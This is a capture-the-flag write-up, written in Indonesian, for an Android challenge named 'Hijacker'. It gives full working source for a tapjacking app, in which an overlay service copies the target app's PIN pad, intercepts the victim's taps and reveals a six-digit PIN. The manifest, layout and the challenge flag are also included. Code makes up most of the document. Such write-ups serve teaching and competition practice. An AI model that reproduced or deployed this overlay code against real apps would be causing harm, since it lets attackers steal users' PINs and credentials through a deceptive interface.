# Mobile

<table><thead><tr><th width="347">Challenge</th><th>Link</th></tr></thead><tbody><tr><td>Hijacker (504 pts)</td><td><a href="#hijacker-504-pts">Here</a></td></tr></tbody></table>

## Hijacker (504 pts)

### Description

\-

### Solution

Diberikan file APK, berikut gambaran ketika file APK tersebut dijalankan

<figure><img src="https://lh7-rt.googleusercontent.com/docsz/AD_4nXcbK3MnBmIwHVyqL7-cfYCj3hqtIGAsZELbbr-Ri55WK5bfMIbYtHpGiRoLqKSTjWx6Ex3YD7u87BJftgxRDx3g2_kxxp8qzUyuZVSbAlmN9iPOqY-pG5qlGEStkTNC2R7y9KHTFqsRsLJfP0bevoNRCIj9?key=K_FOmU9t8UMYPP2CCSzl6g" alt=""><figcaption></figcaption></figure>

Berdasarkan notes kita mengetahui bahwa objective dari soal ini adalah mendapatkan pin dari user.

<figure><img src="https://lh7-rt.googleusercontent.com/docsz/AD_4nXei2WaBY1_JFEvyRgBOcl4U65WxqlBbdO6A2vdg4ddRFgB5qOamYf73Kx2Q4aFFhWswpHEcNKV2iSO_tUWUcBx8mxmbKVkbw_P8kVZXOLNxKjhxUiW2dtBjD_1kMTVUq0QrrhOxUyz6T_1zg8dGEhNBYVc?key=K_FOmU9t8UMYPP2CCSzl6g" alt=""><figcaption></figcaption></figure>

Karena semua permission alam diallow maka disini kita bisa melakukan tapjacking dengan memanfaatkan window service dan layoutinflatter. Agar aplikasi yang kita buat memiliki layout yang sama dengan letak tombol dari aplikasi target maka copy layout dari aplikasi target. Berikut komponen penting dari aplikasi yang kami buat

{% code title="MainActivity.java" %}

```java
package com.example.exploithijacker1;


import android.content.Intent;
import android.os.Bundle;


import androidx.activity.EdgeToEdge;
import androidx.appcompat.app.AppCompatActivity;


public class MainActivity extends AppCompatActivity {


   @Override
   protected void onCreate(Bundle savedInstanceState) {
       super.onCreate(savedInstanceState);
       EdgeToEdge.enable(this);
       setContentView(R.layout.activity_main);
       Intent intent = new Intent(this, Overlay.class);
       startService(intent);
   }
}

```

{% endcode %}

{% code title="Overlay.java" %}

```java
package com.example.exploithijacker1;


import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.graphics.Color;
import android.graphics.PixelFormat;
import android.net.Uri;
import android.os.Build;
import android.os.IBinder;
import android.provider.Settings;
import android.util.Log;
import android.view.Gravity;
import android.view.LayoutInflater;
import android.view.MotionEvent;
import android.view.View;
import android.view.WindowManager;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;


import androidx.annotation.RequiresApi;


public class Overlay extends Service implements View.OnTouchListener, View.OnClickListener {


   WindowManager w;
   View overlayView;
   int count = 0;
   private TextView textView;
   private StringBuilder sb = new StringBuilder();


   @Override
   public IBinder onBind(Intent intent) {
       return null;
   }


   @Override
   public void onClick(View view) {}


   @Override
   public boolean onTouch(View view, MotionEvent motionEvent) {
       return true;
   }


   @RequiresApi(api = Build.VERSION_CODES.O)
   @Override
   public void onCreate() {
       super.onCreate();


       if (!Settings.canDrawOverlays(this)) {
           Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                   Uri.parse("package:" + getPackageName()));
           intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
           startActivity(intent);
           Toast.makeText(this, "Please grant overlay permission", Toast.LENGTH_LONG).show();
           stopSelf();
           return;
       }


       w = (WindowManager) getSystemService(Context.WINDOW_SERVICE);


       overlayView = LayoutInflater.from(this).inflate(R.layout.custom, null);


       overlayView.setOnTouchListener(this);


       WindowManager.LayoutParams params = new WindowManager.LayoutParams(
               WindowManager.LayoutParams.WRAP_CONTENT,
               WindowManager.LayoutParams.WRAP_CONTENT,
               WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
               WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE,
               PixelFormat.TRANSLUCENT
       );


       Button btn1 = overlayView.findViewById(R.id.btn1);
       Button btn2 = overlayView.findViewById(R.id.btn2);
       Button btn3 = overlayView.findViewById(R.id.btn3);
       Button btn4 = overlayView.findViewById(R.id.btn4);
       Button btn5 = overlayView.findViewById(R.id.btn5);
       Button btn6 = overlayView.findViewById(R.id.btn6);
       Button btn7 = overlayView.findViewById(R.id.btn7);
       Button btn8 = overlayView.findViewById(R.id.btn8);
       Button btn9 = overlayView.findViewById(R.id.btn9);
       Button btn0 = overlayView.findViewById(R.id.btn0);
       Button btnClear = overlayView.findViewById(R.id.btn_clear);


       btn1.setOnClickListener(this);
       btn2.setOnClickListener(this);
       btn3.setOnClickListener(this);
       btn4.setOnClickListener(this);
       btn5.setOnClickListener(this);
       btn6.setOnClickListener(this);
       btn7.setOnClickListener(this);
       btn8.setOnClickListener(this);
       btn9.setOnClickListener(this);
       btn0.setOnClickListener(this);
       btnClear.setOnClickListener(this);


       textView = new TextView(this);
       textView.setTextColor(Color.WHITE);
       textView.setTextSize(18);
       textView.setBackgroundColor(Color.BLACK);
       textView.setPadding(20, 20, 20, 20);
       textView.setGravity(Gravity.CENTER);


       WindowManager.LayoutParams textViewParams = new WindowManager.LayoutParams(
               WindowManager.LayoutParams.WRAP_CONTENT,
               WindowManager.LayoutParams.WRAP_CONTENT,
               WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
               WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE,
               PixelFormat.TRANSLUCENT
       );


       textViewParams.gravity = Gravity.TOP | Gravity.CENTER_HORIZONTAL;


       btn1.setOnClickListener(view -> handleButtonClick("1", textViewParams));
       btn2.setOnClickListener(view -> handleButtonClick("2", textViewParams));
       btn3.setOnClickListener(view -> handleButtonClick("3", textViewParams));
       btn4.setOnClickListener(view -> handleButtonClick("4", textViewParams));
       btn5.setOnClickListener(view -> handleButtonClick("5", textViewParams));
       btn6.setOnClickListener(view -> handleButtonClick("6", textViewParams));
       btn7.setOnClickListener(view -> handleButtonClick("7", textViewParams));
       btn8.setOnClickListener(view -> handleButtonClick("8", textViewParams));
       btn9.setOnClickListener(view -> handleButtonClick("9", textViewParams));
       btn0.setOnClickListener(view -> handleButtonClick("0", textViewParams));
       btnClear.setOnClickListener(view -> handleButtonClick("C", textViewParams));


       w.addView(overlayView, params);
   }


   private void handleButtonClick(String input, WindowManager.LayoutParams textViewParams) {
       Log.d(null, "triggered -> " + input);
       sb.append(input);
       count++;
       if (count == 6) {
           textView.setText(sb.toString());
           w.addView(textView, textViewParams);
       }
   }


   @Override
   public void onDestroy() {
       super.onDestroy();
       if (overlayView != null) {
           w.removeView(overlayView);
       }
       if (textView != null) {
           w.removeView(textView);
       }
   }
}

```

{% endcode %}

{% code title="res/layout/custom.xml" %}

```xml
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android" android:gravity="center" android:orientation="vertical" android:padding="16dp" android:layout_width="match_parent" android:layout_height="match_parent">
   <TextView android:textSize="24sp" android:textStyle="bold" android:layout_width="wrap_content" android:layout_height="wrap_content" android:layout_marginBottom="24dp" android:text="Enter Your PIN"/>
   <LinearLayout android:gravity="center" android:orientation="horizontal" android:layout_width="wrap_content" android:layout_height="wrap_content">
       <TextView android:textSize="24sp" android:gravity="center" android:id="@+id/pin1" android:layout_width="48dp" android:layout_height="48dp" android:layout_marginLeft="4dp" android:layout_marginRight="4dp" android:text="-" android:layout_marginHorizontal="4dp"/>
       <TextView android:textSize="24sp" android:gravity="center" android:id="@+id/pin2" android:layout_width="48dp" android:layout_height="48dp" android:layout_marginLeft="4dp" android:layout_marginRight="4dp" android:text="-" android:layout_marginHorizontal="4dp"/>
       <TextView android:textSize="24sp" android:gravity="center" android:id="@+id/pin3" android:layout_width="48dp" android:layout_height="48dp" android:layout_marginLeft="4dp" android:layout_marginRight="4dp" android:text="-" android:layout_marginHorizontal="4dp"/>
       <TextView android:textSize="24sp" android:gravity="center" android:id="@+id/pin4" android:layout_width="48dp" android:layout_height="48dp" android:layout_marginLeft="4dp" android:layout_marginRight="4dp" android:text="-" android:layout_marginHorizontal="4dp"/>
       <TextView android:textSize="24sp" android:gravity="center" android:id="@+id/pin5" android:layout_width="48dp" android:layout_height="48dp" android:layout_marginLeft="4dp" android:layout_marginRight="4dp" android:text="-" android:layout_marginHorizontal="4dp"/>
       <TextView android:textSize="24sp" android:gravity="center" android:id="@+id/pin6" android:layout_width="48dp" android:layout_height="48dp" android:layout_marginLeft="4dp" android:layout_marginRight="4dp" android:text="-" android:layout_marginHorizontal="4dp"/>
   </LinearLayout>
   <LinearLayout android:orientation="vertical" android:layout_width="wrap_content" android:layout_height="wrap_content" android:layout_marginTop="24dp">
       <LinearLayout android:orientation="horizontal" android:layout_width="wrap_content" android:layout_height="wrap_content">
           <Button android:textSize="24sp" android:id="@+id/btn1" android:layout_width="98dp" android:layout_height="98dp" android:text="1"/>
           <Button android:textSize="24sp" android:id="@+id/btn2" android:layout_width="98dp" android:layout_height="98dp" android:layout_marginLeft="5dp" android:layout_marginRight="5dp" android:text="2" android:layout_marginHorizontal="5dp"/>
           <Button android:textSize="24sp" android:id="@+id/btn3" android:layout_width="98dp" android:layout_height="98dp" android:text="3"/>
       </LinearLayout>
       <LinearLayout android:orientation="horizontal" android:layout_width="wrap_content" android:layout_height="wrap_content">
           <Button android:textSize="24sp" android:id="@+id/btn4" android:layout_width="98dp" android:layout_height="98dp" android:text="4"/>
           <Button android:textSize="24sp" android:id="@+id/btn5" android:layout_width="98dp" android:layout_height="98dp" android:layout_marginLeft="5dp" android:layout_marginRight="5dp" android:text="5" android:layout_marginHorizontal="5dp"/>
           <Button android:textSize="24sp" android:id="@+id/btn6" android:layout_width="98dp" android:layout_height="98dp" android:text="6"/>
       </LinearLayout>
       <LinearLayout android:orientation="horizontal" android:layout_width="wrap_content" android:layout_height="wrap_content">
           <Button android:textSize="24sp" android:id="@+id/btn7" android:layout_width="98dp" android:layout_height="98dp" android:text="7"/>
           <Button android:textSize="24sp" android:id="@+id/btn8" android:layout_width="98dp" android:layout_height="98dp" android:layout_marginLeft="5dp" android:layout_marginRight="5dp" android:text="8" android:layout_marginHorizontal="5dp"/>
           <Button android:textSize="24sp" android:id="@+id/btn9" android:layout_width="98dp" android:layout_height="98dp" android:text="9"/>
       </LinearLayout>
       <LinearLayout android:orientation="horizontal" android:layout_width="wrap_content" android:layout_height="wrap_content">
           <Button android:textSize="24sp" android:id="@+id/btn0" android:layout_width="98dp" android:layout_height="98dp" android:text="0"/>
           <Button android:textSize="24sp" android:id="@+id/btn_empty" android:background="#00000000" android:layout_width="98dp" android:layout_height="98dp" android:layout_marginLeft="5dp" android:layout_marginRight="5dp" android:layout_marginHorizontal="5dp"/>
           <Button android:textSize="24sp" android:id="@+id/btn_clear" android:layout_width="98dp" android:layout_height="98dp" android:text="C"/>
       </LinearLayout>
   </LinearLayout>
</LinearLayout>

```

{% endcode %}

{% code title="AndroidManifest.xml" %}

```xml
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android" android:versionCode="1" android:versionName="1.0" android:compileSdkVersion="34" android:compileSdkVersionCodename="14" >


   <uses-sdk android:minSdkVersion="24" android:targetSdkVersion="34"/>
   <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW"/>
   <uses-permission android:name="android.permission.INTERNET"/>
   <permission android:name="com.example.exploithijacker1.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION" android:protectionLevel="signature"/>
   <uses-permission android:name="com.example.exploithijacker1.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION"/>
   <application
       android:allowBackup="true"
       android:dataExtractionRules="@xml/data_extraction_rules"
       android:fullBackupContent="@xml/backup_rules"
       android:icon="@mipmap/ic_launcher"
       android:label="@string/app_name"
       android:roundIcon="@mipmap/ic_launcher_round"
       android:supportsRtl="true"
       android:theme="@style/Theme.ExploitHijacker1">


       <service
           android:name="com.example.exploithijacker1.Overlay"
           android:enabled="true"
           android:exported="true"></service>


       <activity
           android:name="com.example.exploithijacker1.MainActivity"
           android:exported="true">
           <intent-filter>
               <action android:name="android.intent.action.MAIN" />


               <category android:name="android.intent.category.LAUNCHER" />
           </intent-filter>
       </activity>
       <provider android:name="androidx.startup.InitializationProvider" android:exported="false" android:authorities="com.example.exploithijacker1.androidx-startup">
           <meta-data android:name="androidx.emoji2.text.EmojiCompatInitializer" android:value="androidx.startup"/>
           <meta-data android:name="androidx.lifecycle.ProcessLifecycleInitializer" android:value="androidx.startup"/>
           <meta-data android:name="androidx.profileinstaller.ProfileInstallerInitializer" android:value="androidx.startup"/>
       </provider>
       <receiver android:name="androidx.profileinstaller.ProfileInstallReceiver" android:permission="android.permission.DUMP" android:enabled="true" android:exported="true" android:directBootAware="false">
           <intent-filter>
               <action android:name="androidx.profileinstaller.action.INSTALL_PROFILE"/>
           </intent-filter>
           <intent-filter>
               <action android:name="androidx.profileinstaller.action.SKIP_FILE"/>
           </intent-filter>
           <intent-filter>
               <action android:name="androidx.profileinstaller.action.SAVE_PROFILE"/>
           </intent-filter>
           <intent-filter>
               <action android:name="androidx.profileinstaller.action.BENCHMARK_OPERATION"/>
           </intent-filter>
       </receiver>
   </application>


</manifest>
```

{% endcode %}

Compile menjadi apk dan upload ke POC tester. Malicious apps kita akan dijalankan terlebih dahulu lalu ketika victim membuka aplikasi hijacker victim akan menekan button pinnya, disini aplikasi kita akan berada didepan layout aplikasi asli sehingga menyebabkan penekanan yang ada masuk ke aplikasi malicious kita dan ketika sudah mendapatkan pin sepanjang 6 akan dilakukan show pin ke layar yang akhirnya ditampilkan pada POC tester. Berikut hasil dari POC Tester

<figure><img src="https://lh7-rt.googleusercontent.com/docsz/AD_4nXc7j4Pf_XM7ZlxA5RieUv9DdUenba0Q91OO_2r143r9B9DpO3MEWzJPy_GhlGSnNiKJepAVB4RP_7p-73jq4bv0IN9NUQiLfxHrTNQqooxMGMWAeRsG0mDT6hTVxtycfyuP-4FlTt4hlDPy4yGM1ckjuqmT?key=K_FOmU9t8UMYPP2CCSzl6g" alt=""><figcaption></figcaption></figure>

<figure><img src="https://lh7-rt.googleusercontent.com/docsz/AD_4nXd4ZNj22IPWS4i8L8Dyyqv_zQpfIQoIP8RMzoQ24ywxGToLLtpYgzNnVia6q0foOJ2xUAYGJ5CHUbegW0VYF4HggBu9S1NaxlZvhu0Uxi864FLFuzRqf2jBJdXJxI1doqcjtFAYj5n03af6WTDU5IHn2oAx?key=K_FOmU9t8UMYPP2CCSzl6g" alt=""><figcaption></figcaption></figure>

Flag: INTECHFEST{T4pj4ck1ng\_In\_Andr01d?!?!}
